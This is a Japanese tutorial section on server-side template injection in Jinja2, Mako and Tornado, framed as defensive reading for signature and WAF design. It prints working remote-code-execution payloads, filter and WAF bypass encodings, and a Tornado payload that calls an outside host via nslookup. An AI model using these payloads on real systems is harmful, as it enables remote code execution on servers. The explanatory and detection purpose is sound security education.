## Jinja2ペイロード最適化とMako/Tornado

前節までで、SSTI（Server-Side Template Injection：ユーザー入力がテンプレートの「コード」として評価されてしまう欠陥）が最終的にRCE（Remote Code Execution：リモートからの任意コード実行）へ至る一般原理を見た。本節では、Pythonの3大テンプレートエンジン **Jinja2 / Mako / Tornado** に絞り込み、次の2点を仕組みレベルで掘り下げる。

1. **Jinja2のペイロード最適化** — なぜ「最短ペイロード」を探すことに意味があり、どういう原理（Pythonオブジェクトのグラフ探索）で導けるのか。
2. **Mako / Tornado** — Jinja2とは内部構造が異なるため、到達経路（sink：入力が最終的に実行・解釈される危険な代入先）も別物になる。それぞれの固有チェーンを押さえる。

本節はすべて **防御目的**（検知シグネチャ設計、WAFルール検証、サンドボックス設計の評価）で記述する。実在サービスや本番環境への無許可検証、破壊的手順は扱わない。ペイロードは「攻撃者が何を書いてくるか」を守り手が理解するための参照として示す。

---

### なぜ「最短ペイロード」を最適化するのか

古典的なJinja2 RCEペイロードは、次のような **添字（index）依存** の形をとっていた。

```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
```

- `''.__class__` は空文字列 `str` のクラス（`str`）。
- `.__mro__`（Method Resolution Order：メソッド解決順序）は継承の親をたどる配列で、`[2]`（あるいは `.mro()[1]`）で最上位の `object` に到達する。
- `object.__subclasses__()` は「その時点でロードされている全サブクラスのリスト」を返す。ここに `subprocess.Popen` や `<class 'os._wrap_close'>`、ファイルを開くクラスなどが紛れ込んでいる。
- 攻撃者は目的クラスのインデックス（例では `[396]` や `[40]`）を指定して呼び出す。

**この方式の致命的な弱点**は、`__subclasses__()` の順序と長さが**環境依存**だという点にある。読み込まれているモジュール、Pythonのマイナーバージョン、インポート順が違えば `[396]` の中身は別のクラスにずれる。これはセキュリティ研究者 Rémi Gascou（Podalirius）が「**egg hunter（卵探し）方式**」と呼んで批判した性質で、CTFの1環境では動くが、汎用的な攻撃コード・検知シグネチャの土台としては脆い。

そこで登場するのが **コンテキストフリー（context-free）で、かつ最短のペイロード** を体系的に導く発想である。これがGreHack 2021の研究テーマだった。守り手にとっての意味は明確で、「攻撃者が添字に依存しない普遍的な短いペイロードを持っている」前提でシグネチャや入力検証を組む必要がある、ということだ。

> ⚠️ **未取得の資料**: 「GreHack 2021 - Optimizing Server Side Template Injection payloads for Jinja2（ResearchGate版）」は自動取得できませんでした（理由: ResearchGateがHTTP 403 Forbiddenを返しアクセス拒否）。以下のURLからご自身で直接ご覧ください: https://www.researchgate.net/publication/378299322_GreHack_2021_-_Optimizing_Server_Side_Template_Injection_payloads_for_Jinja2
>
> なお、同一著者（Podalirius）が自身の公開ページで同じ論文・スライド・解説記事を配布しており、本節の技術内容はそちらの原典（下記URL）から取得して記述している: https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/

#### グラフ探索としてのペイロード最適化（GreHack 2021の中核アイデア）

研究の核心は、**「Pythonオブジェクトの世界を有向グラフとしてモデル化し、到達可能な入口ノードから高価値ターゲット（`os` モジュールや組み込み関数）への最短経路を探索する」** という考え方である。

- **ノード**＝Pythonオブジェクト（`cycler`、`str`、`os` モジュール、各関数など）。
- **エッジ**＝属性アクセス（`.attr`）や添字アクセス。あるオブジェクトから別のオブジェクトへ「一歩」で到達できる関係。
- **入口ノード**＝Jinja2テンプレート内でデフォルトで参照できるグローバル変数。
- **ゴールノード**＝`os` モジュールや `__builtins__.__import__` など、コマンド実行に使える高価値オブジェクト。

探索アルゴリズムは **幅優先探索（BFS：Breadth-First Search）** を用いる。BFSはグラフを「近いノードから順に」波紋状に探るため、**最初にゴールへ到達した経路が自動的に最短経路になる**という性質を持つ。これがまさに「最短ペイロード」を得たい目的に合致する。

ただしPythonオブジェクトのグラフには **循環参照** が大量にある（`a.__class__.__class__...` は無限にたどれる）。無限ループを避けるため、アルゴリズムは **訪問済みオブジェクトの `id()`（メモリ上の一意な識別子）をリストに記録** し、同じオブジェクトを二度と展開しない。原典の表現を借りれば「探索した各オブジェクトの `id` を格納するリストを作る」ことで、有向グラフの探索を有限化している。再帰関数が設定した最大深さまで属性を掘り下げ、その途中でモジュールや組み込み関数といった高価値ターゲットへの経路を収集する。

> 出典: GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2 — https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/

#### 導かれた最短ペイロードと、その原理

この探索が見つけ出した、添字に依存しない **コンテキストフリー最短経路** が次の3本である。

```jinja2
{{ cycler.__init__.__globals__.os }}
{{ joiner.__init__.__globals__.os }}
{{ namespace.__init__.__globals__.os }}
```

いずれも `os` モジュールそのものに到達するまで**約45文字**で、従来の `''.__class__.mro()[1].__subclasses__()[396]...` 型（100文字超）と比べて大幅に短い。

**なぜこれで `os` に届くのか** を仕組みで説明する。

- `cycler` / `joiner` / `namespace` は、Jinja2が**デフォルトでテンプレートに注入するグローバル変数**（ユーティリティ）である。攻撃者が何も準備しなくても常に存在する、信頼できる「入口ノード」だ。
- これらは `jinja2.utils` モジュール内で定義されたクラスの実体。`cycler.__init__` はそのクラスの初期化メソッド（関数オブジェクト）。
- あらゆるPython関数は `__globals__` という属性を持ち、これは **「その関数が定義されたモジュールのグローバル名前空間（辞書）」** を指す。
- `cycler` は `jinja2.utils` で定義されているため、`cycler.__init__.__globals__` は `jinja2.utils` のグローバル辞書になる。そして `jinja2.utils` は内部で `import os` している。したがって `__globals__` 辞書に `os` キーが存在し、`.os` で直接 `os` モジュールへ到達できる。

ここまで来れば、実際のコマンド実行は `os` の関数を呼ぶだけである（原典・PayloadsAllTheThingsの実物）。

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

- `lipsum`（ロレム・イプサム生成関数）は少し特殊で、**関数そのもの**なので `.__init__` を挟まず `lipsum.__globals__` で直接そのモジュールのグローバル辞書に届く。ここでも `os` がインポートされているため `lipsum.__globals__["os"]` で `os` を取れる。この点で `lipsum` はさらに短く、実戦で最も多用される入口の一つ。
- `os.popen('id').read()` は `id` コマンドを実行し標準出力を読み取る。防御観点では、これら4つのグローバル名（`cycler` `joiner` `namespace` `lipsum`）と `__globals__` の組み合わせは**Jinja2 SSTIの決定的シグネチャ**になる。

> ⚠️ 環境依存の注意: `os` が `__globals__` 直下に存在するかは、その入口モジュールが実際に `import os` しているかに依存する。Jinja2のバージョンや内部実装で `jinja2.utils` のインポート内容が変われば、`.os` が消える可能性がある。その場合の汎用フォールバックが、`os` を経由せず組み込み関数から `__import__` する経路である。

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

- `__builtins__` は常に存在する組み込み名前空間で、その中の `__import__` は `import 文` の内部実装関数。`__import__('os')` は動的に `os` をインポートして返すため、**入口モジュールが `os` を import していなくても**到達できる。より確実だが、その分ペイロードは長くなる。「短さ（検知回避）」と「確実さ（環境非依存）」はトレードオフになる、という点が最適化研究の実務的な含意である。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### Jinja2のフィルタ／WAFバイパスとサンドボックス脱出

守り手がブラックリスト（`_`、`.`、`class`、`os` などの語をフィルタ）で防ごうとしても、Jinja2の言語機能そのものが回避手段を与えてしまう。攻撃者がどう「禁止文字を書かずに同じ属性へ到達するか」を理解しておく必要がある。

#### アンダースコア `_` のフィルタ回避

`__class__` のような **ダンダー（double underscore）属性** をフィルタしたい場合、`_` そのものを禁止しがちだが、`attr` フィルタと文字列連結で組み立てられてしまう。

```jinja2
{{ request|attr(["__","class","__"]|join) }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
```

- `attr(name)` フィルタは「文字列 `name` で表される属性」を動的に取得する。`getattr(obj, name)` 相当。
- `"_"*2` は Jinja2内の文字列演算で `"__"` を生成する。`|join` でリストを連結し `"__class__"` を組み上げる。**ペイロードの表面には `__class__` という連続文字列が現れない**ため、単純な部分文字列マッチのWAFを抜ける。

さらに、禁止語をリクエストパラメータ側に外出しして、テンプレート本文からは変数参照だけにする手口もある（原典の実物）。

```
/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
```

- `request.args.usc` は `?usc=_` の値 `_`、`request.args.class` は `?class=class`。テンプレート本文には `_` も `class` という文字列も直接は書かれず、すべてクエリ経由で注入される。

#### 角括弧 `[` `]` の回避（format）

添字/リテラルリストの `[` を禁止された場合、`format` フィルタでC言語風の書式文字列を使う。

```
/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

- `f=%s%sclass%s%s`、`a=_` を与えると、`format` が `%s` を順に `_` で置換して `__class__` を生成する。`[` `]` も `join` も使わずに属性名を作る。

#### 16進エンコードによる属性アクセス

属性名の各文字を `\xNN` に置換して、キーワードマッチを回避する。

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

- `\x5f` は `_` のASCIIコード。`\x5f\x5fglobals\x5f\x5f` は評価時に `__globals__` になる。文字列リテラル内のエスケープはPython側で展開されるため、**WAFが素の `__globals__` を検索しても一致しない**。`attr(...)` を鎖状に連ねて `request.application → __globals__ → __builtins__ → __import__('os') → popen('id') → read()` と正攻法の経路をたどる。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

#### サンドボックス（SandboxedEnvironment）と脱出の原理

Jinja2には防御機構として `SandboxedEnvironment` が用意されている。これは通常の `Environment` を差し替えるもので、内部では属性アクセス（`getattr`）や添字アクセスを **`is_safe_attribute()` / `is_safe_callable()`** というフックで検査する。既定では、

- `_` で始まる属性（`__class__`、`__globals__`、`__init__` など内部属性）へのアクセスを**拒否**する。
- 安全でないと判断された呼び出しを `SecurityError` で弾く。

したがって、前述の `cycler.__init__.__globals__...` 型は**サンドボックス下では原則ブロックされる**。これが「最短ペイロードはサンドボックスなしのナイーブな `render_template_string` 実装を前提にしている」と守り手が理解すべき理由である。

一方で、サンドボックスの脱出は歴史的に何度も見つかっている。原理は「**内部属性を直接触らずに、公開された安全な属性の連鎖の先に危険な参照が漏れている**」経路を探すこと。たとえば `str.format` の書式指定経由で属性へ到達する古典的手法（`{0.__class__}` 相当の書式）や、文字列フォーマットのフィールドアクセスがサンドボックスのチェックを迂回するケースが知られてきた。防御の結論は明確で、**サンドボックスは「多層防御の一枚」であって信頼境界そのものにはできない**。ユーザー入力を**テンプレートのソースとして**渡す設計（`render_template_string(user_input)` など）を根絶することが唯一の確実な対策である。

---

### Mako テンプレートのRCE経路

Mako（Pyramid/Pylons系や多くのPythonアプリで使われる）はJinja2と**言語仕様も内部構造も別物**なので、到達経路も異なる。

- **展開構文は `${ ... }`**（Jinja2の `{{ }}` ではない）。検知シグネチャを書くときはこの差を必ず区別する。
- Makoは制御構文としてPythonをかなり直接的に埋め込める設計で、そもそもサンドボックスを主目的にしていない。次のように**素のPython文**を書ける場合すらある。

```mako
<%import os%>
${os.popen('id').read()}
```

- `<% ... %>` はPythonコードブロック、`${ ... }` は式の展開。`import os` して `os.popen` を呼ぶだけで、Jinja2のようなオブジェクトグラフ探索は不要。Makoでは「テンプレート＝ほぼPython」なので、注入できた時点でRCE難度は極めて低い。

`import` すら書けない制約下でも、Makoは内部モジュールを通じて `os` に到達する固有チェーンが多数存在する（原典では48種のバリエーションが挙げられている）。

```mako
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.__init__.__globals__['os'].system('id')}
```

- `self` はコンパイル済みテンプレートのネームスペースオブジェクト。`self.module` からMako内部モジュール（`mako.runtime`、`mako.cache` など）へたどれ、それらは実装上 `os` や `util` を参照している。**Jinja2の `__globals__` 経路と発想は同じ**（「内部モジュールがインポート済みの `os` を借用する」）だが、経由するモジュール名がMako固有である点が違う。
- `${self.__init__.__globals__['os'].system('id')}` はJinja2の最短ペイロードと構造的にそっくりで、テンプレートオブジェクトの `__globals__` に `os` が居ることを利用する。

数値難読化（`id` を文字コードで組む）も同じ発想で可能。

```mako
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

- `[105,100]` は `'i','d'` のASCIIコード。`chr()` で文字化し `join` で連結して `'id'` を生成する。ペイロード中に文字列 `id` が現れないためキーワードフィルタを回避する。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### Tornado テンプレートのRCE経路

Tornado（TornadoフレームワークのテンプレートエンジンやTornado互換）は、**展開構文がJinja2と同じ `{{ }}`** という点が厄介で、検知時に混同しやすい。しかし内部挙動は大きく異なる。

```python
{{7*7}}      # → 49（検出）
{{7*'7'}}    # → Pythonの文字列反復。 '7777777'
```

Tornado最大の特徴は、**`{% %}` ブロック内で任意のPython文（`import` を含む）を実行できる**こと。したがって到達難度はMako同様に低い。

```jinja2
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

- `{% import os %}` でモジュールを取り込み、`{{ os.system(...) }}` で実行する。Jinja2のようにオブジェクトグラフをたどって `os` を「発掘」する必要がなく、`import` を直接書ける。
- 環境によっては `os` がテンプレート名前空間にあらかじめ露出していて、`{{os.system('whoami')}}` だけで通ることもある。

**検知上の実務ポイント**: `{{ }}` を見ただけでJinja2と決めつけず、`{% import ... %}`（Tornado/Jinja2双方にあるが用途が違う）や `${ }`（Mako）の有無、`7*'7'` の反応（`7777777` を返すのはPython系）で**エンジンを指紋採取（fingerprint）** してから、そのエンジン固有の危険パターンに絞ってルールを当てるのが正攻法である。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### 3エンジン横断のまとめ（防御者の視点）

| 観点 | Jinja2 | Mako | Tornado |
|---|---|---|---|
| 展開構文 | `{{ }}` / `{% %}` | `${ }` / `<% %>` | `{{ }}` / `{% %}` |
| `import` 直書き | 不可（グラフ探索が必要） | 可（`<%import os%>`） | 可（`{%import os%}`） |
| 代表的sink到達経路 | `cycler/lipsum/joiner/namespace .__globals__.os` | `self.module...os` / `self.__init__.__globals__` | `os.system`（直接） |
| RCE難度 | 中（サンドボックス次第） | 低 | 低 |
| サンドボックス | `SandboxedEnvironment`あり（脱出研究多数） | 実質なし | 実質なし |

- **Jinja2の最短ペイロード最適化**が教えてくれる守りの要点は、「攻撃者は添字依存を捨て、`__globals__` 経由の**環境非依存かつ短い**普遍ペイロードを持っている」という前提でシグネチャを作ること。素朴に `__subclasses__` や特定インデックスだけを監視しても、`cycler.__init__.__globals__.os` 系や `lipsum.__globals__` 系を見落とす。
- **共通シグネチャ**として `__globals__`、`__init__.__globals__`、`__builtins__`、`__import__`、`popen`、`os.system`、そして4つのJinja2グローバル名（`cycler` `lipsum` `joiner` `namespace`）は高い識別力を持つ。ただし前述の `attr`/`format`/16進エンコードで難読化されうるため、**文字列マッチだけに頼らず、そもそもユーザー入力をテンプレートソースにしない**設計上の対策が根本策になる。
- エンジンの**指紋採取**（`${ }` の有無、`7*'7'` の応答など）を先に行い、エンジン固有の危険経路に絞ることで、誤検知を抑えつつ検知率を上げられる。

> 出典: GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2 — https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/
> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
